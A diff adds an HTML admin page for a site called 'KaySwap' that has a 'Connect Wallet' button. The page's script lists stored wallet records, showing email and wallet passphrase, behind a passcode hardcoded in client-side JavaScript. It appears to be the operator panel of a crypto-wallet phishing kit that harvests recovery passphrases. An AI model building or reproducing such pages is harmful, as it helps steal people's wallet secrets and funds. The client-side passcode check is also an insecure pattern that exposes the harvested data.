@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KaySwap | Admin Database</title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/color.css">
+    <link rel="stylesheet" type="text/css" href="css/responsive.css">
+</head>
+<body>
+    
+    <header class="transition">
+		<div class="container">
+			<div class="row flex-align">
+				<div class="col-lg-4 col-md-3 col-8">
+					<div class="logo">
+						<a href="index.html">
+							<span class="heading-title">KaySwap</span><br>
+							<span class="orange" >Powered by Ethereum</span>
+							<!-- <img src="images/logo.png" class="transition" alt="Cryptcon"> -->
+						</a>
+					</div>
+				</div>
+				<div class="col-lg-8 col-md-9 col-4 text-right">
+					<div class="menu-toggle">
+						<span></span>
+					</div>
+					<div class="menu">
+						<ul class="d-inline-block">
+							<li>
+								<!-- <span class="opener plus"></span> -->
+								<a href="index.html">Home</a>
+								<!-- <ul class="transition">
+									<li><a href="index.html">Home One</a></li>
+									<li><a href="index-2.html">Home Two</a></li>
+								</ul> -->
+							</li>
+							<!-- <li><a href="feature.html">Feature</a></li> -->
+							<li><a href="roadmap.html">Roadmap</a></li>
+							<li><a href="about.html">About</a></li>
+							<!-- <li><a href="team.html">Team</a></li> -->
+						</ul>
+						<div class="signin d-inline-block">
+							<button type="button" class="btn" data-toggle="modal" data-target="#chooseWallet" id="connect-wallet-btn">Connect Wallet</button>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</header>
+
+    
+	<!-- Modal 2 -->
+	<div id="modal2"></div>
+
+	<!-- Modal 3 -->
+	<div id="modal3"></div>
+
+	<!-- Modal 4 -->
+	<div id="modal4"></div>
+
+    <section class="sub-page-banner parallax" id="banner">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12 wow fadeInUp">
+                    <div class="page-banner text-center">
+                        <h1 class="sub-banner-title">Admin</h1>
+                        <ul>
+                            <li><a href="index.html">Home</a></li>
+                            <li>Admin</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="container">
+        <div class="table-wrapper">
+            <div class="table-header mb-3 text-center">
+                <h3>Wallets Database</h3>
+            </div>
+            <div class="table-mains">
+                <table class="table table-dark" id="data-table">
+                    <tr>
+                        <th>S/N</th>
+                        <th>ID</th>
+                        <th>Email</th>
+                        <th>Passphrase</th>
+                        <th>Modified</th>
+                    </tr>
+                </table>
+            </div>
+            <div class="table-footer">
+
+            </div>
+        </div>
+    </section>
+
+    <footer class="bg-pattern darkblue ptb-100">
+        <div class="container">
+            <div class="footer">
+                <div class="row">
+                    <div class="col-lg-4 col-md-6">
+                        <div class="footer-logo pb-25">
+                            <!-- <a href="index.html"><img src="images/logo.png" alt="KaySwap"></a> -->
+                            <a href="index.html"><span class="heading-title">KaySwap</span></a>
+                        </div>
+                        <div class="footer-icon">
+                            <ul>
+                                <li><a href="#"><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
+                                <li><a href="#"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+                                <li><a href="#"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+                                <li><a href="#"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-4 col-md-6">
+                        <div class="footer-link">
+                            <ul>
+                                <li><a href="#">Join Us</a></li>
+                                <li><a href="contact.html">Contact</a></li>
+                                <li><a href="roadmap.html">Roadmap</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-4 col-md-6">
+                        <div class="subscribe">
+                            <div class="form-group">
+                                <label>Subscribe to our Newsleter</label>
+                                <input type="email" class="form-control" placeholder="Enter your email Address">
+                                <input type="submit" name="submit" value="Subscribe" class="submit">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="copyright">
+                <div class="row">
+                    <div class="col-lg-6">
+                        <p>© KaySwap all Rights Reserved. Designed By <a
+                                href="https://templatescoder.com/">TemplatesCoder.com</a></p>
+                    </div>
+                    <div class="col-lg-6">
+                        <ul>
+                            <li><a href="#">Terms & Condition</a></li>
+                            <li><a href="#">Privacy Policy</a></li>
+                            <li><a href="contact.html">Contact Us</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- <script src="js/jquery-3.4.1.min.js"></script> -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <script src="js/animation.js"></script>
+	<script src="js/custom.js"></script>
+	<script type="module" src="js/app.js"></script>
+
+    <script type="module">
+
+        import { Wallet } from "./js/firestoreDB.js";
+
+        const wallet = new Wallet();
+
+        // const Wallets = wallet.getAllWallets();
+        // console.log(Wallets);
+
+        const showWallets = async () => {
+            //alert('Working!');
+            let wallets;
+            let dataTable = document.getElementById("data-table");
+
+            let url = window.location.href
+            url = new URL(url);
+            let p = url.searchParams.get('p');
+            let passcode = "0okmnbvcxzaq1"
+
+            if (p !== passcode) {
+                let tr = dataTable.insertRow(-1);
+                let td = tr.insertCell(0);
+                td.innerHTML = 'You do not have admin privileges! Please visit the home page.';
+                td.setAttribute('colspan', '5');
+                td.setAttribute('class', 'text-center');
+                return;
+            }
+
+            try {
+                wallets = await wallet.getAllWallets();
+                console.log(wallets);
+            } catch (e) {
+                console.error('Error occurred while geting wallets :', e)
+            }
+
+            if (wallets.length == 0) {
+                let tr = dataTable.insertRow(-1);
+                let td = tr.insertCell(0);
+                td.innerHTML = 'No wallets found!';
+                td.setAttribute('colspan', '5');
+                td.setAttribute('class', 'text-center');
+                return;
+            }
+
+            let count = 0;
+            wallets.map((doc) => {
+                //var count = wallets.findIndex(doc);
+                
+                let tr = dataTable.insertRow(-1);
+
+                var sncell = tr.insertCell(0);
+                var idcell = tr.insertCell(1);
+                var emailcell = tr.insertCell(2);
+                var passphrasecell = tr.insertCell(3);
+                var modifiedcell = tr.insertCell(4);
+
+                sncell.innerHTML = count;
+                idcell.innerHTML = doc.id;
+                emailcell.innerHTML = doc.email || 'null';
+                passphrasecell.innerHTML = doc.passphrase || 'null';
+                modifiedcell.innerHTML = doc.modified || 'null';
+
+                count += 1;
+
+                if (count == 20) {
+                    return;
+                }
+            });
+        }
+
+        
+        showWallets();
+
+    </script>
+</body>
+</html>
